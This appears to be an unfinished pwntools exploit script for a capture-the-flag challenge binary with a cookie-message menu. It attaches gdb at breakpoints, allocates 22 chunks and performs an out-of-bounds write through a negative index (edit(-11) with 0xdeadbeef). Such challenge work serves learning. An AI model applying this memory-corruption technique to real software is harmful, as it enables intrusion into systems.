from pwn import * 

binary = "./chall_patched"
p = process(binary)
s = '''
b * read_cookie+106
b edit_cookie
b * edit_cookie+177
'''

def eat():
    p.sendlineafter(">", '1')
def create(size, data):
    p.sendlineafter(">", '2')
    p.sendlineafter("How long is the message?", str(size))
    p.sendlineafter("Input your message:", data)
def edit(idx, data):
    p.sendlineafter(">", '3')
    p.sendlineafter("Which cookie?", str(idx))
    p.sendafter("New Message:", data)
def show(idx):
    p.sendlineafter(">", '4')
    p.sendlineafter("Which cookie?", str(idx))

def exit_program(p):
    p.sendlineafter(b">\n", b"5")

gdb.attach(p, s)

for i in range(22):
    create(0x88, b"AAAAAAAA")
edit(-11, p64(0xdeadbeef))
                        

p.interactive()